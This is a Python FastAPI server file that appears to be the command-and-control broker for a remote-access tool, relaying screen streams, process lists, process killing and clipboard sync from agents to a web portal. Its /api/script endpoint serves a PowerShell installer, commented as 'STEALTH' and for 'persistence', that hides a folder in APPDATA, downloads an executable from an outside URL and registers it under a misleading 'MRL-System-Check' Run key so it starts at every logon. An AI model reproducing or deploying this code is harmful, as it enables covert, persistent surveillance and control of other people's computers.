import asyncio
import orjson
import os
import sys
import time
import socket
import datetime
import struct
from typing import List, Dict, Set

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, Request
from fastapi.staticfiles import StaticFiles
import uvicorn

VERSION = "6.1.0-LAYOUT-FIX" # Trigger Clean Build
app = FastAPI()


RECORDINGS_DIR = "recordings"
REGISTRY_FILE = "devices.json"
RECORDINGS_JSON = os.path.join(RECORDINGS_DIR, "recordings.json")
if not os.path.exists(RECORDINGS_DIR): os.makedirs(RECORDINGS_DIR)

# Broker State
PORTALS: Set[WebSocket] = set()
CLIENTS: Dict[str, WebSocket] = {}
PORTAL_TO_CLIENT: Dict[WebSocket, str] = {}
DEVICE_REGISTRY: Dict[str, dict] = {}

def load_registry():
    global DEVICE_REGISTRY
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "rb") as f:
                DEVICE_REGISTRY = orjson.loads(f.read())
                # Force all to Offline on start
                for dev in DEVICE_REGISTRY.values():
                    dev["status"] = "Offline"
        except: DEVICE_REGISTRY = {}

def save_registry():
    try:
        with open(REGISTRY_FILE, "wb") as f:
            f.write(orjson.dumps(DEVICE_REGISTRY, option=orjson.OPT_INDENT_2))
    except: pass

def load_recordings():
    if not os.path.exists(RECORDINGS_JSON): return []
    try:
        with open(RECORDINGS_JSON, "rb") as f:
            return orjson.loads(f.read())
    except: return []

def save_recording_entry(entry):
    recs = load_recordings()
    recs.append(entry)
    with open(RECORDINGS_JSON, "wb") as f:
        f.write(orjson.dumps(recs, option=orjson.OPT_INDENT_2))

load_registry()

class ConnectionManager:
    async def connect(self, websocket: WebSocket, client_type: str, client_id: str = None):
        # NOTE: websocket.accept() is already called in the endpoint before connect()
        if client_type == "portal":
            PORTALS.add(websocket)
        else:
            CLIENTS[client_id] = websocket
            if client_id not in DEVICE_REGISTRY:
                DEVICE_REGISTRY[client_id] = {"hostname": client_id, "status": "Active", "cpu": 0, "ram": 0, "specs": {}}
            DEVICE_REGISTRY[client_id]["status"] = "Active"
            save_registry()

    def disconnect(self, websocket: WebSocket):
        if websocket in PORTALS:
            PORTALS.remove(websocket)
            PORTAL_TO_CLIENT.pop(websocket, None)
        else:
            for cid, ws in list(CLIENTS.items()):
                if ws == websocket:
                    CLIENTS.pop(cid)
                    if cid in DEVICE_REGISTRY:
                        DEVICE_REGISTRY[cid]["status"] = "Offline"
                    save_registry()
                    break

    async def broadcast_to_portals(self, data: bytes, client_id: str = None):
        if not client_id: return
        # Pro-Level: Parallel broadcasting to prevent slow clients from blocking the pipe
        await asyncio.gather(*[
            portal.send_bytes(data)
            for portal in list(PORTALS)
            if PORTAL_TO_CLIENT.get(portal) == client_id
        ], return_exceptions=True)


    async def send_to_client(self, client_id: str, data: dict):
        client_ws = CLIENTS.get(client_id)
        if client_ws:
            try: await client_ws.send_json(data)
            except: pass

manager = ConnectionManager()

@app.get("/api/recordings")
async def list_recordings():
    recordings = []
    if not os.path.exists(RECORDINGS_DIR): return []
    for f in os.listdir(RECORDINGS_DIR):
        if f.endswith(".mp4"):
            path = os.path.join(RECORDINGS_DIR, f)
            stat = os.stat(path)
            recordings.append({
                "name": f, "size": f"{stat.st_size / (1024*1024):.2f} MB",
                "timestamp": stat.st_mtime,
                "date": datetime.datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
            })
    recordings.sort(key=lambda x: x["timestamp"], reverse=True)
    return recordings

@app.get("/api/devices")
async def list_devices():
    return list(DEVICE_REGISTRY.values())

@app.get("/api/script")
async def get_deploy_script(request: Request):
    # Returns a STEALTH PowerShell script for persistence
    # Automatically detects the public URL from the request
    host = request.headers.get("host") or socket.gethostbyname(socket.gethostname())
    is_https = request.headers.get("x-forwarded-proto") == "https"
    protocol = "https" if is_https else "http"
    
    ps_script = f"""
$host_url = "{protocol}://{host}"
$dir = "$env:APPDATA\\MRL-Service"
if (!(Test-Path $dir)) {{ New-Item -ItemType Directory -Path $dir -Force | Out-Null; (Get-Item $dir).Attributes = 'Hidden' }}

$client_path = "$dir\\mrl_agent.exe"
$tmp_path = "$env:TEMP\\mrl_agent_new.exe"

# Step 1: Download to TEMP first (old agent still running - no lock conflict)
$url = "https://raw.githubusercontent.com/umonkt-dotcom/umonkt/main/mrl_agent.exe"
Write-Host "Downloading MRL Secure Agent Payload... Please Wait" -ForegroundColor Cyan
if (Test-Path $tmp_path) {{ Remove-Item $tmp_path -Force -ErrorAction SilentlyContinue }}
Invoke-WebRequest -Uri $url -OutFile $tmp_path -TimeoutSec 300

# Verify download is complete (must be at least 10MB)
$size = (Get-Item $tmp_path).Length
if ($size -lt 10MB) {{
    Write-Host "Download incomplete ($size bytes). Please try again." -ForegroundColor Red; exit 1
}}

# Step 2: Now kill old agent and wait for it to fully exit
Stop-Process -Name mrl_agent -Force -ErrorAction SilentlyContinue
$deadline = (Get-Date).AddSeconds(10)
while ((Get-Process -Name mrl_agent -ErrorAction SilentlyContinue) -and (Get-Date) -lt $deadline) {{
    Start-Sleep -Milliseconds 200
}}

# Step 3: Replace old exe with the newly downloaded one
for ($i = 0; $i -lt 15; $i++) {{
    try {{
        if (Test-Path $client_path) {{ Remove-Item $client_path -Force -ErrorAction Stop }}
        Move-Item $tmp_path $client_path -Force -ErrorAction Stop
        break
    }} catch {{ Start-Sleep -Seconds 1 }}
}}

$reg_key = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $reg_key -Name "MRL-System-Check" -Value "`"$client_path`" --server {host.split(':')[0]}"

Write-Host "Agent successfully installed. Booting telemetry uplink..." -ForegroundColor Green
Start-Process -FilePath $client_path -ArgumentList "--server {host.split(':')[0]}"
    """.strip()
    return Response(content=ps_script, media_type="text/plain")

@app.get("/api/client_exe")
async def get_client_exe():
    with open("mrl_agent.exe", "rb") as f:
        return Response(content=f.read(), media_type="application/octet-stream")

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    client_type = "portal"
    client_id = None
    await websocket.accept()
    try:
        data = await websocket.receive_text()
        handshake = orjson.loads(data)
        if handshake.get("type") == "client_auth":
            client_type = "client"
            client_id = str(handshake.get("id"))
            if client_id in DEVICE_REGISTRY:
                DEVICE_REGISTRY[client_id].update(handshake.get("specs", {}))
                DEVICE_REGISTRY[client_id]["specs"] = handshake.get("specs", {})
            else:
                DEVICE_REGISTRY[client_id] = {
                    "hostname": client_id,
                    "status": "Active",
                    "cpu": 0,
                    "ram": 0,
                    "specs": handshake.get("specs", {})
                }
        
        await manager.connect(websocket, client_type, client_id)
        
        if client_type == "portal":
            await websocket.send_text(orjson.dumps({"type": "handshake", "data": {"monitors": [], "hostname": "Broker Hub"}}).decode())
        
        while True:
            if client_type == "portal":
                data = await websocket.receive_text()
                event = orjson.loads(data)
                if event.get("t") == "ping":
                    pass  # keepalive, ignore
                elif event["t"] == 'deselect_device':
                    PORTAL_TO_CLIENT[websocket] = None
                elif event["t"] == "select_device":
                    PORTAL_TO_CLIENT[websocket] = str(event["id"])
                elif event["t"] in ("rtc_offer", "rtc_ice", "get_processes", "kill_process", "clipboard_sync"):
                    target_client = PORTAL_TO_CLIENT.get(websocket)
                    if target_client:
                        await manager.send_to_client(target_client, event)
                else:
                    target = PORTAL_TO_CLIENT.get(websocket)
                    if target: await manager.send_to_client(target, event)
            else:
                # Client can send text (signaling) or bytes (stats)
                raw = await websocket.receive()
                if raw["type"] == "websocket.receive" and raw.get("text"):
                    # WebRTC signaling answer/ICE from agent → forward to portals
                    try:
                        msg = orjson.loads(raw["text"])
                        if msg.get("t") in ("rtc_answer", "rtc_ice"):
                            data_str = orjson.dumps(msg).decode()
                            for portal in list(PORTALS):
                                try: await portal.send_text(data_str)
                                except: pass
                    except: pass
                elif raw["type"] == "websocket.receive" and raw.get("bytes"):
                    data = raw["bytes"]
                    # Update status in registry for stats packets (Type 5)
                    if data[0] == 5:
                        try:
                            stats = orjson.loads(data[2:])
                            if client_id and client_id in DEVICE_REGISTRY:
                                DEVICE_REGISTRY[client_id].update(stats)
                                DEVICE_REGISTRY[client_id]["status"] = "Active"
                        except: pass
                    if client_id:
                        await manager.broadcast_to_portals(data, client_id)
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        import traceback
        err_msg = traceback.format_exc()
        print(f"CRITICAL WEBSOCKET ERROR ({client_type}:{client_id}): {e}")
        with open("crash_log.txt", "a") as f:
            f.write(f"[{client_type}:{client_id}] {e}\n{err_msg}\n")
        manager.disconnect(websocket)

app.mount("/recordings", StaticFiles(directory=RECORDINGS_DIR), name="recordings")
app.mount("/", StaticFiles(directory=".", html=True), name="static")

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
